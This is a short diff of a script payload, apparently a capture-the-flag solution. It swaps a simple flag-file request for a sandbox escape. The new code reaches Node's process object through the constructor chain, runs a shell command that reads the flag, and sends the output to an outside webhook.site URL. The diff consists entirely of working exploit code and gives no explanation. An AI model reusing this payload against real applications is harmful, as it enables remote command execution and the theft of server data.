@@ -1,5 +1,7 @@
 <script>
-var r = new XMLHttpRequest();
-r.open('GET', '/flag.txt', true);
-r.send();
+    const f = this.constructor.constructor;
+    const fetch = f('return fetch')();
+    const process = f('return process')();
+    let flag = process.binding('spawn_sync').spawn({file: '/bin/bash',args: ['/bin/bash', '-c', '/app/readflag'], stdio: [{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}]}).output[1].toString()
+    fetch('https://webhook.site/8425cd72-f0a5-44cd-81ec-946747faa9f8?flag=' + flag).then(r => r.text())
 </script>
